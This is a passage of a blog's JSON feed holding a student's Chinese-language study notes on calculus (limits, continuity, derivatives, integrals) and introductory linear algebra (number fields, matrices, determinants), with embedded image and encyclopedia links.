            "content_html": "<h1 id=\"高等数学一\"><a class=\"anchor\" href=\"#高等数学一\">#</a> 高等数学・一</h1>\n<hr />\n<p>学习时做的一些笔记，顺便对内容梳理一遍。^0</p>\n<hr />\n<h2 id=\"第一章-函数与极限\"><a class=\"anchor\" href=\"#第一章-函数与极限\">#</a> 第一章 函数与极限</h2>\n<hr />\n<h3 id=\"第一节-映射与函数\"><a class=\"anchor\" href=\"#第一节-映射与函数\">#</a> 第一节 映射与函数</h3>\n<ul>\n<li>\n<p><strong>映射</strong></p>\n<blockquote>\n<p>与 x 所对应的 y 称为 x 在映射 f 下的象。<br />\nx 称为 y 在 f 下的原象。</p>\n</blockquote>\n<blockquote>\n<p><strong>满射、一一映射、单射、双射</strong></p>\n<p>A 映射得到的 B 集合等于映射的目标集合则是满射。</p>\n<p>对每个 y 都有唯一一个 x 对应，则是<strong>单射</strong>或称<strong>一一映射</strong>。</p>\n<p>若 f 既是满射又是单射则称为<strong>双射</strong>。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>函数定义与表示方法</strong></p>\n<ul>\n<li>\n<p>特殊函数</p>\n<ul>\n<li>\n<p>狄利克雷函数</p>\n<blockquote>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_2.png\" alt=\"00_2\" title=\"狄利克雷函数\" /></p>\n<p>狄利克雷函数是一个定义在实数范围上、值域不连续的函数。狄利克雷函数的图像以 Y 轴为对称轴，是一个偶函数，它处处不连续，处处极限不存在，不可黎曼积分。这是一个处处不连续的可测函数。</p>\n</blockquote>\n</li>\n<li>\n<p>符号函数</p>\n<blockquote>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_3-1663132097343.png\" alt=\"00_3\" title=\"符号函数\" /></p>\n</blockquote>\n</li>\n<li>\n<p>取整函数</p>\n<blockquote>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/image-20220914131129520.png\" alt=\"image-20220914131129520\" /></p>\n<p>函数 y=[x] 称为取整函数，也称<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklQUIlOTglRTYlOTYlQUYlRTUlODclQkQlRTYlOTUlQjAvMjY3MDk1MT9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==\">高斯函数</span>。其中不超过实数 x 的最大整数称为 x 的整数部分，记作 [x]。该函数被广泛应用于<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTglQUUlQkEvMzcwMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==\">数论</span>，函数绘图和计算机领域。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>\n<p>函数的有界性</p>\n<blockquote>\n<p>函数 f (x) 在 D 上有界的充要条件是 f (x) 在 D 上既有上界又有下界。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>函数的单调性</strong></p>\n<ul>\n<li>单调增 (减) 函数</li>\n<li>严格单调增 (减) 函数</li>\n</ul>\n</li>\n<li>\n<p><strong>函数的四则运算</strong></p>\n</li>\n<li>\n<p><strong>复合函数</strong></p>\n<blockquote>\n<p>形如： <strong>f(g(u(x)))</strong> 或 <strong>f</strong> o <strong>g</strong> o <strong>u</strong></p>\n</blockquote>\n</li>\n<li>\n<p><strong>反函数</strong></p>\n<blockquote>\n<p>反函数的单调性基本归纳于 <strong>先外后内，同增异减</strong>。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>初等函数</strong></p>\n<blockquote>\n<p>初等函数是由<strong>幂函数（power function）、指数函数（exponential function）、对数函数（logarithmic function）、三角函数（trigonometric function）、反三角函数（inverse trigonometric function</strong> 与常数经过有限次的有理运算（加、减、乘、除、有理数次乘方、有理数次开方）及有限次函数复合所产生，并且能用一个解析式表示的函数。</p>\n</blockquote>\n</li>\n</ul>\n<hr />\n<h3 id=\"第二节-数列的极限\"><a class=\"anchor\" href=\"#第二节-数列的极限\">#</a> 第二节 数列的极限</h3>\n<ul>\n<li>\n<p><strong>邻域</strong></p>\n<ul>\n<li>邻域</li>\n<li>去心邻域</li>\n<li>左 (右) 邻域</li>\n</ul>\n</li>\n<li>\n<p><strong>数列基本概念</strong></p>\n<ul>\n<li>\n<p>有限 or 无限</p>\n</li>\n<li>\n<p>通项公式</p>\n</li>\n<li>\n<p>整标函数</p>\n</li>\n<li>\n<p>子数列</p>\n</li>\n<li>\n<p>单调性</p>\n<blockquote>\n<p>作差或作商求单调性。有时候利用数列的单调性可能会得到惊喜的解题方式。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTUlODglOTclRTYlOUUlODElRTklOTklOTA/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94\">数列极限</span></p>\n</li>\n<li>\n<p><strong>收敛数列与数列的有界性</strong></p>\n<blockquote>\n<p><strong>tip：数列收敛一定有界，数列有界不一定收敛</strong></p>\n</blockquote>\n<ul>\n<li>极限唯一性 &amp; 有界性 &amp; 保号性</li>\n</ul>\n</li>\n<li>\n<p>极限四则运算法则（严格意义上要分别证明数列的与函数的）</p>\n</li>\n</ul>\n<hr />\n<h3 id=\"第三节-函数的极限\"><a class=\"anchor\" href=\"#第三节-函数的极限\">#</a> 第三节 函数的极限</h3>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODclQkQlRTYlOTUlQjAlRTYlOUUlODElRTklOTklOTAvNzI3MDgz\">函数极限</span><img data-src=\"https://evefortosaber.github.io/Open-pictures/00_1.png\" alt=\"00_1\" /></p>\n<blockquote>\n<p>函数某点极限存在的充要条件是左右极限都存在且相等。</p>\n</blockquote>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQjUlQjclRTYlQjYlODUlRTUlQUUlOUElRTclOTAlODY/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94\">海涅 (Heine) 定理</span></p>\n</li>\n<li>\n<p>求函数极限</p>\n<ul>\n<li>简单的有限次函数，如果最高次项系数相等比较最高次项系数，如果不等，次数高的为高阶无穷大量。</li>\n<li>妙用，分子有理化，分母有理化。</li>\n<li>通分消去。</li>\n<li>立方差、因式分解。</li>\n<li>裂项等将无穷项收缩的方法。</li>\n<li>......</li>\n</ul>\n</li>\n<li>\n<p>复合函数极限</p>\n</li>\n</ul>\n<hr />\n<h3 id=\"第四节-函数的连续性\"><a class=\"anchor\" href=\"#第四节-函数的连续性\">#</a> 第四节 函数的连续性</h3>\n<ul>\n<li>\n<p>连续性概念</p>\n<blockquote>\n<p>由极限的性质可知，一个函数在某点连续的充要条件是它在该点左右都连续。</p>\n</blockquote>\n</li>\n<li>\n<p>间断点分类</p>\n</li>\n</ul>\n",
            "tags": [
                "Notes"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/Mathematics/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/",
            "url": "http://example.com/2023/03/19/Mathematics/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%94%E8%AE%B0%E4%B8%80/",
            "title": "线性代数笔记一",
            "date_published": "2023-03-19T11:29:17.406Z",
            "content_html": "<h1 id=\"线性代数笔记一\"><a class=\"anchor\" href=\"#线性代数笔记一\">#</a> 线性代数笔记一</h1>\n<h2 id=\"第一章-线性方程组\"><a class=\"anchor\" href=\"#第一章-线性方程组\">#</a> 第一章 线性方程组</h2>\n<h3 id=\"数域及n元向量\"><a class=\"anchor\" href=\"#数域及n元向量\">#</a> 数域及 N 元向量</h3>\n<h4 id=\"数域的一些相关\"><a class=\"anchor\" href=\"#数域的一些相关\">#</a> 数域的一些相关</h4>\n<ul>\n<li>\n<p>设 P 是由一些数组成的集合，<strong>&lt;u&gt; 其中包括 0 与 1&lt;/u&gt;</strong>，如果 P 中任意两个数的<em><strong>和、差、积、商</strong></em>（除数不为 0）仍是 P 中的数，则称 P 为一个数域。</p>\n<p><strong>常见数域</strong>： 复数域<strong> C</strong>；实数域<strong> R</strong>；有理数域<strong> Q</strong>。</p>\n<p><em>（注意：自然数集 N 及整数集 Z 都不是数域。）</em></p>\n<p><strong>说明：</strong></p>\n<ul>\n<li>\n<p>若数集 P 中任意两个数作某一运算的结果仍在 P 中，则说数集 P 对这个运算是封闭的。</p>\n</li>\n<li>\n<p><strong>数域的等价定义</strong>：如果一个包含 0，1 在内的数集 P 对于加法，减法，乘法与除法（除数不为 0）是封闭的，则称数集 P 为一个数域。</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>逆元、单位元</strong></p>\n<ul>\n<li>\n<p><strong>逆元</strong>：在集合中定义某种运算 f (x)，元素与其逆元进行 f (x) 运算得到该运算单位元。</p>\n<ul>\n<li>加法逆元：即相反数，元素与其加法逆元之和为加法单位元 0。</li>\n<li>乘法逆元：即倒数，元素与其乘法逆元之积为乘法单位元 1。</li>\n</ul>\n</li>\n<li>\n<p><strong>单位元</strong>：当它和其他元素结合时，并不会改变那些元素。</p>\n<ul>\n<li>加法单位元 0，n+o=n;</li>\n<li>乘法单位元 1，n*1=n;</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>&lt;u&gt;<strong> 由数域的定义知数域中一定含有加法逆元乘法逆元，加法单位元乘法单位元。</strong>&lt;/u&gt;</p>\n</li>\n</ul>\n<h4 id=\"集合与向量\"><a class=\"anchor\" href=\"#集合与向量\">#</a> 集合与向量</h4>\n<ul>\n<li>笛卡尔积</li>\n<li>多元有序数组</li>\n<li>坐标系\n<ul>\n<li>多元有序数组是 N 维空间与笛卡尔积的集合的映射。</li>\n</ul>\n</li>\n<li>列向量与横向量</li>\n</ul>\n<h3 id=\"矩阵初识\"><a class=\"anchor\" href=\"#矩阵初识\">#</a> 矩阵初识</h3>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/02_1.png\" alt=\"02-1\" /></p>\n<blockquote>\n<p>元素是<strong>实数</strong>的矩阵称为<strong>实矩阵</strong>，元素是<strong>复数</strong>的矩阵称为<strong>复矩阵</strong>。而<strong>行数与列数都等于 n</strong> 的矩阵称为<strong> n 阶矩阵</strong>或<strong> n 阶方阵</strong>。</p>\n</blockquote>\n<p>​</p>\n<ul>\n<li>\n<p><strong>初等变换</strong></p>\n</li>\n<li>\n<p>单位阵（diag）</p>\n</li>\n<li>\n<p>矩阵相等必须先是同型矩阵</p>\n</li>\n<li>\n<p>同型矩阵才能做加减</p>\n</li>\n<li>\n<p>行阶梯矩阵，行简化形阶梯矩阵</p>\n<p>每个矩阵都与唯一一个行简化阶梯矩阵对应（行阶梯矩阵不唯一，行简化阶梯矩阵唯一）</p>\n</li>\n<li>\n<p>矩阵的秩</p>\n<p>设非零矩阵<em><strong> A</strong></em> 经过初等行变化化为行阶梯形矩阵<em><strong> R</strong></em>，<em><strong>R</strong></em> 中非零行的个数称为矩阵<em><strong> A</strong></em> 的秩，记作 rank<em><strong>A</strong></em>，或者 r (<em><strong>A</strong></em>)。</p>\n</li>\n</ul>\n<h3 id=\"线性方程组\"><a class=\"anchor\" href=\"#线性方程组\">#</a> 线性方程组</h3>\n<h4 id=\"有解判别定理\"><a class=\"anchor\" href=\"#有解判别定理\">#</a> 有解判别定理</h4>\n<p>线性方程组根据解的判定定理判定为：r（A）=r（A|b）</p>\n<p>秩要相等。（在做题时要给出判定）</p>\n<h4 id=\"同解方程组\"><a class=\"anchor\" href=\"#同解方程组\">#</a> 同解方程组</h4>\n<ul>\n<li>反身性</li>\n<li>对称性</li>\n<li>传递性</li>\n</ul>\n<h4 id=\"消元步骤\"><a class=\"anchor\" href=\"#消元步骤\">#</a> 消元步骤</h4>\n<ol>\n<li>\n<p>特解</p>\n<p>增广矩阵化简到行简化阶梯矩阵</p>\n</li>\n<li>\n<p>通解</p>\n</li>\n</ol>\n<h2 id=\"第二章-行列式\"><a class=\"anchor\" href=\"#第二章-行列式\">#</a> 第二章 行列式</h2>\n<h3 id=\"行列式\"><a class=\"anchor\" href=\"#行列式\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQTElOEMlRTUlODglOTclRTUlQkMlOEY/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94\">行列式</span></h3>\n<h3 id=\"计算\"><a class=\"anchor\" href=\"#计算\">#</a> 计算</h3>\n<ul>\n<li>\n<p>三对角行列式计算</p>\n<blockquote>\n<p>常用递推法，三角化方法解决。</p>\n<p>考虑到类似数列的求通项法。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>异乘变零</strong></p>\n</li>\n</ul>\n<h3 id=\"展开\"><a class=\"anchor\" href=\"#展开\">#</a> 展开</h3>\n<ul>\n<li>\n<p>按行按列展开</p>\n<blockquote>\n<p>注意语句，等式逻辑，<strong>余子式与代数余子式的区别</strong>。</p>\n</blockquote>\n<p><em><strong>余子式的逆运算，不止一个原式</strong></em> (替换某一列 (行) 的数据不改变其余子式)</p>\n</li>\n<li>\n<p>范德蒙德展开</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/fandemengdehanglieshi.jpg\" alt=\"fandingyi\" /></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/fan_2.jpg\" alt=\"fan_2\" /></p>\n</li>\n<li>\n<p>含 0 阵的行列式展开 ***(按块展开)***</p>\n</li>\n</ul>\n<p><strong>行列式的转置还是它自己，即值不变。</strong></p>\n<h2 id=\"第三章-矩阵\"><a class=\"anchor\" href=\"#第三章-矩阵\">#</a> 第三章 矩阵</h2>\n<h3 id=\"矩阵加法\"><a class=\"anchor\" href=\"#矩阵加法\">#</a> 矩阵加法</h3>\n<p>必须是同型矩阵，对应元素分别相加。</p>\n<h3 id=\"矩阵乘法\"><a class=\"anchor\" href=\"#矩阵乘法\">#</a> 矩阵乘法</h3>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/xindai_10_07_juzhengchengfa.jpg\" alt=\"chengfdingyi\" /></p>\n<p>行列相乘法，左矩阵的列数要等于右矩阵的行数。</p>\n<p>注意元素对应。矩阵乘法一般不可逆。单位阵相乘可逆，对角阵相乘可逆。</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/xiandaijuzhen0.jpg\" alt=\"xiandai\" /></p>\n<h3 id=\"矩阵的转置与行列式化\"><a class=\"anchor\" href=\"#矩阵的转置与行列式化\">#</a> 矩阵的转置与行列式化</h3>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/image-20221007184533201.png\" alt=\"image-20221007184533201\" /></p>\n<p>若矩阵<strong> A</strong> 满足<strong> A=A<sup>T</sup></strong>，则称<strong> A</strong> 为<strong>对称矩阵</strong>；若<strong> A<sup>T</sup>=-A</strong>，则称 A 为<strong>反对称矩阵</strong>.</p>\n<ul>\n<li><em><strong>A+A<sup>T</sup>,AA<sup>T</sup></strong></em> 是对称矩阵</li>\n<li><em><strong>A-A<sup>T</sup></strong></em> 是反对称矩阵</li>\n<li><strong>E<sub>n</sub><sup>T</sup>=E<sub>n</sub></strong></li>\n<li>奇数阶反对称矩阵的行列式等于 0</li>\n<li>.|k<strong>A</strong>|=k<sup>n</sup>|<strong>A</strong>|.</li>\n<li>.|<em><strong>AB</strong></em>|=|<strong>A</strong>||<strong>B</strong>|.</li>\n</ul>\n<h3 id=\"初等矩阵\"><a class=\"anchor\" href=\"#初等矩阵\">#</a> 初等矩阵</h3>\n<ul>\n<li>\n<p>左行右列定理</p>\n<blockquote>\n<p>如果矩阵 A 左 (右) 乘一个初等矩阵，那么相当于对 A 做了一次和它完全相同的初等行 (列) 变换</p>\n</blockquote>\n</li>\n<li>\n<p>方阵的迹</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/ca954c14e1a12fb64383e5786d37e4d3.svg\" alt=\"img\" /></p>\n</li>\n<li>\n<p><strong>tr(AB)=tr(BA)</strong></p>\n</li>\n<li>\n<p><strong>tr(A<sup>T</sup>)=tr(A)</strong></p>\n</li>\n</ul>\n<h3 id=\"伴随矩阵\"><a class=\"anchor\" href=\"#伴随矩阵\">#</a> 伴随矩阵</h3>\n<h3 id=\"矩阵逆元\"><a class=\"anchor\" href=\"#矩阵逆元\">#</a> 矩阵逆元</h3>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%BA%8C/",
            "url": "http://example.com/2023/03/19/Mathematics/%E6%95%B0%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%BA%8C/",
            "title": "数学笔记二",
            "date_published": "2023-03-19T11:29:17.406Z",
            "content_html": "<h1 id=\"数学笔记二\"><a class=\"anchor\" href=\"#数学笔记二\">#</a> 数学笔记・二</h1>\n<h3 id=\"第四节-函数的连续性承第一章函数与极限\"><a class=\"anchor\" href=\"#第四节-函数的连续性承第一章函数与极限\">#</a> 第四节 函数的连续性（承第一章函数与极限）</h3>\n<ul>\n<li>\n<p>连续性概念</p>\n<blockquote>\n<p>由极限的性质可知，一个函数在某点连续的充要条件是它在该点左右都连续。</p>\n</blockquote>\n</li>\n<li>\n<p>间断点分类</p>\n<ul>\n<li>\n<p><strong>第一类间断点</strong></p>\n<blockquote>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEYlQUYlRTUlOEUlQkIlRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=\">可去间断点</span></strong>：函数在该点左极限、右极限存在且相等，但不等于该点函数值或函数在该点无定义。如函数 y=（x^2-1)/(x-1) 在点 x=1 处。</p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQjclQjMlRTglQjclODMlRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=\">跳跃间断点</span></strong>：函数在该点左极限、右极限存在，但不相等。如函数 y=|x|/x 在点 x=0 处。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>第二类间断点</strong></p>\n<blockquote>\n<p><a href=\"https://baike.baidu.com/item/%E6%97%A0%E7%A9%B7%E9%97%B4%E6%96%AD%E7%82%B9/3531630?fromModule=lemma_inlink\"><strong>无穷间断点</strong></a>：函数在该点可以无定义，且左极限、右极限至少有一个不存在，且函数在该点极限为∞。如函数 y=tanx 在点 x=π/2 处。</p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOEMlQUYlRTglOEQlQTElRTklOTclQjQlRTYlOTYlQUQlRTclODIlQjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=\">振荡间断点</span></strong>：函数在该点可以无定义，当自变量趋于该点时，函数值在两个常数间变动无限多次。如函数 y=sin (1/x) 在 x=0 处。</p>\n</blockquote>\n</li>\n<li>\n<p>由上述对各种间断点的描述可知，<strong>函数 f (x) 在第一类间断点的左右极限都存在，而函数 f (x) 在第二类间断点的左右极限至少有一个不存在</strong>，这也是第一类间断点和第二类间断点的本质上的区别。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"第五节\"><a class=\"anchor\" href=\"#第五节\">#</a> 第五节</h3>\n<ul>\n<li>\n<p>迫敛准则</p>\n<p>主要是放缩，抓住可合成量（如 N 个 1 求和为 n*(n+1)/2），和高阶量不变原则</p>\n</li>\n<li>\n<p><strong>单调有界准则</strong></p>\n<p>单调有界数列必有极限。用于证明收敛很有用。</p>\n<p>求极限时可以<strong>先假设存在</strong>。方便计算。<s>（避免求数列通项）</s></p>\n</li>\n<li>\n<p><strong>两个重要极限</strong></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/image-20220921223539147.png\" alt=\"image-20220921223539147\" /></p>\n<blockquote>\n<p>第二个很重要，第一个可以直接看成等价无穷小。</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"第六节\"><a class=\"anchor\" href=\"#第六节\">#</a> 第六节</h3>\n<ul>\n<li>\n<p><strong>无穷小量</strong></p>\n<blockquote>\n<p>确切地说，当自变量 x 无限接近 x&lt;sub&gt;0&lt;/sub&gt;（或 x 的绝对值无限增大）时，函数值 f (x) 与 0 无限接近，即 f (x)→0 (或 f (x)=0)，则称 f (x) 为当 x→x&lt;sub&gt;0&lt;/sub&gt;(或 x→∞) 时的无穷小量。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>等阶无穷小量</strong></p>\n<p>即两个无穷小量坐商得常数时。</p>\n</li>\n<li>\n<p><strong>等价无穷小量</strong></p>\n<p>即两个无穷小量坐商得 1。等价无穷小量可互换。</p>\n</li>\n<li>\n<p><strong>常见等价无穷小量</strong></p>\n<p><img data-src=\"https://pica.zhimg.com/v2-f20a929bed77e97c61a9f83de9b4b5a4_r.jpg?source=1940ef5c\" alt=\"aa\" title=\"等价无穷小\" /></p>\n</li>\n</ul>\n<hr />\n<p><em>关于我突然变水的原因</em>：</p>\n<p>实在是比较忙，各项内容也越来越复杂，所以就择取主要的知识点并舍去证明。</p>\n<p><em>以上。</em></p>\n<h2 id=\"第二章\"><a class=\"anchor\" href=\"#第二章\">#</a> 第二章</h2>\n<h3 id=\"导数\"><a class=\"anchor\" href=\"#导数\">#</a> 导数</h3>\n<ul>\n<li>\n<p>导数定义</p>\n<blockquote>\n<p>函数可导一定连续，函数连续不一定可导。</p>\n</blockquote>\n</li>\n<li>\n<p>求导法则</p>\n<p>注意除法，反函数，隐函数求导法则。</p>\n<blockquote>\n<p>掌握反代的思想，掌握对数求导法。</p>\n</blockquote>\n</li>\n<li>\n<p>含参求导</p>\n<p>一阶导可直接求二阶导可能需要反代。</p>\n</li>\n</ul>\n<blockquote>\n<p>注意导数与微分的关系，如何二阶导隐函数。以及推导方法。</p>\n</blockquote>\n<ul>\n<li>\n<p>断点处的导数求解，在有定义时使用求导法。</p>\n<p>在无定义时，使用定义法。(求极限)</p>\n</li>\n<li>\n<p>高阶函数求导注意规律，和复合函数的导</p>\n</li>\n</ul>\n<h3 id=\"微分\"><a class=\"anchor\" href=\"#微分\">#</a> 微分</h3>\n<ul>\n<li>\n<p>一元函数，可导则可微</p>\n</li>\n<li>\n<p>微分常数 A，与极限有关</p>\n</li>\n<li>\n<p>微分运算类似求导法则</p>\n</li>\n<li>\n<p>微分近似运算</p>\n<p>f(x)=f(x0)+f'(x0)(x-x0)</p>\n<blockquote>\n<p>为了计算 f (x)，可找一个邻近于 x 的 x0，只要 f (x) 和 f'(x) 容易计算，就可以利用这个公式计算 f (x) 的近似值。</p>\n</blockquote>\n</li>\n</ul>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E5%BE%AE%E5%88%86%E8%BF%91%E4%BC%BC%E8%AE%A1%E7%AE%97.jpg\" alt=\"微分\" /></p>\n<h2 id=\"第三章\"><a class=\"anchor\" href=\"#第三章\">#</a> 第三章</h2>\n<h3 id=\"微分中值定理\"><a class=\"anchor\" href=\"#微分中值定理\">#</a> 微分中值定理</h3>\n<ul>\n<li>\n<p>费马引理</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E8%B4%B9%E9%A9%AC%E5%BC%95%E7%90%86.jpg\" alt=\"费马引理\" /></p>\n</li>\n<li>\n<p>罗尔中值定理</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E7%BD%97%E5%B0%94%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg\" alt=\"罗尔中值定理\" /></p>\n</li>\n<li>\n<p>拉格朗日中值定理</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg\" alt=\"拉格朗日中值定理\" /></p>\n</li>\n<li>\n<p>柯西中值定理</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E6%9F%AF%E8%A5%BF%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg\" alt=\"柯西中值定理\" /></p>\n</li>\n</ul>\n<p>洛必达法则</p>\n<p>泰勒公式</p>\n<p>麦克劳林公式</p>\n<ul>\n<li>\n<p>佩亚诺余项</p>\n<p>高阶无穷小</p>\n</li>\n<li>\n<p>拉格朗日余项</p>\n<p>中值 -- 定量分析</p>\n</li>\n</ul>\n<p>函数的凹凸性</p>\n<h2 id=\"第四章\"><a class=\"anchor\" href=\"#第四章\">#</a> 第四章</h2>\n<h4 id=\"不定积分\"><a class=\"anchor\" href=\"#不定积分\">#</a> 不定积分</h4>\n<h5 id=\"换元积分\"><a class=\"anchor\" href=\"#换元积分\">#</a> 换元积分</h5>\n<h5 id=\"分部积分\"><a class=\"anchor\" href=\"#分部积分\">#</a> 分部积分</h5>\n<blockquote>\n<p>凑微分，低次换元，三角换元，二次换元，重复型</p>\n</blockquote>\n<h5 id=\"积分表\"><a class=\"anchor\" href=\"#积分表\">#</a> 积分表</h5>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E7%A7%AF%E5%88%86%E8%A1%A8.jpg\" alt=\"积分表\" /></p>\n<h5 id=\"有理函数的不定积分\"><a class=\"anchor\" href=\"#有理函数的不定积分\">#</a> 有理函数的不定积分</h5>\n<p>待定系数法</p>\n<ul>\n<li>\n<p>万能公式</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E4%B8%87%E8%83%BD%E5%85%AC%E5%BC%8F.jpg\" alt=\"万能公式\" /></p>\n</li>\n</ul>\n<h4 id=\"定积分\"><a class=\"anchor\" href=\"#定积分\">#</a> 定积分</h4>\n<h5 id=\"定积分概念求无穷项和的极限\"><a class=\"anchor\" href=\"#定积分概念求无穷项和的极限\">#</a> 定积分概念求无穷项和的极限</h5>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E5%AE%9A%E7%A7%AF%E5%88%86%E6%A6%82%E5%BF%B5.jpg\" alt=\"定积分概念\" /></p>\n<h5 id=\"估值定理\"><a class=\"anchor\" href=\"#估值定理\">#</a> 估值定理</h5>\n<p>区间内的 Max 与 Min 乘以区间长度得到限定区间。</p>\n<h5 id=\"积分中值定理\"><a class=\"anchor\" href=\"#积分中值定理\">#</a> 积分中值定理</h5>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/%E7%A7%AF%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86.jpg\" alt=\"积分中值定理\" /></p>\n<p>求积分函数极限时用到，由介值定理推得</p>\n<h5 id=\"几何意义\"><a class=\"anchor\" href=\"#几何意义\">#</a> 几何意义</h5>\n<h5 id=\"牛顿莱布尼茨公式\"><a class=\"anchor\" href=\"#牛顿莱布尼茨公式\">#</a> 牛顿莱布尼茨公式</h5>\n<h5 id=\"微积分学基本定理\"><a class=\"anchor\" href=\"#微积分学基本定理\">#</a> 微积分学基本定理</h5>\n<p>连续函数必存在原函数</p>\n<h5 id=\"平面曲线的弧长与曲率\"><a class=\"anchor\" href=\"#平面曲线的弧长与曲率\">#</a> 平面曲线的弧长与曲率</h5>\n<ul>\n<li><img data-src=\"https://evefortosaber.github.io/Open-pictures/1%E5%BC%A7%E9%95%BF%E5%85%AC%E5%BC%8F.png\" alt=\"1弧长公式\" /></li>\n<li><img data-src=\"https://evefortosaber.github.io/Open-pictures/2%E5%BC%A7%E9%95%BF%E5%85%AC%E5%BC%8F.png\" alt=\"2\" /></li>\n<li><img data-src=\"https://evefortosaber.github.io/Open-pictures/3%E5%BC%A7%E9%95%BF%E5%85%AC%E5%BC%8F.png\" alt=\"3\" /></li>\n</ul>\n<h5 id=\"极坐标系\"><a class=\"anchor\" href=\"#极坐标系\">#</a> 极坐标系</h5>\n<p><em><strong>x=pcosa,y=psina;</strong></em></p>\n<h5 id=\"平面曲线的曲率\"><a class=\"anchor\" href=\"#平面曲线的曲率\">#</a> 平面曲线的曲率</h5>\n<h5 id=\"曲率圆\"><a class=\"anchor\" href=\"#曲率圆\">#</a> 曲率圆</h5>\n<h5 id=\"定积分的几何应用\"><a class=\"anchor\" href=\"#定积分的几何应用\">#</a> 定积分的几何应用</h5>\n<h5 id=\"连续函数的平均值\"><a class=\"anchor\" href=\"#连续函数的平均值\">#</a> 连续函数的平均值</h5>\n<h5 id=\"定积分在物理学与经济学\"><a class=\"anchor\" href=\"#定积分在物理学与经济学\">#</a> 定积分在物理学与经济学</h5>\n<ul>\n<li>\n<p>变力做功</p>\n</li>\n<li>\n<p>引力问题</p>\n</li>\n<li>\n<p>液体侧面压力</p>\n</li>\n</ul>\n<h5 id=\"反常积分\"><a class=\"anchor\" href=\"#反常积分\">#</a> 反常积分</h5>\n",
            "tags": [
                "Notes"
            ]
        },
        {
            "id": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%A4%9A%E5%A4%9A%E6%9E%9C%E5%AD%90%E9%97%AE%E9%A2%98/",
            "url": "http://example.com/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%A4%9A%E5%A4%9A%E6%9E%9C%E5%AD%90%E9%97%AE%E9%A2%98/",
            "title": "多多果子问题二叉堆与优先序列",
            "date_published": "2023-03-19T11:29:17.362Z",
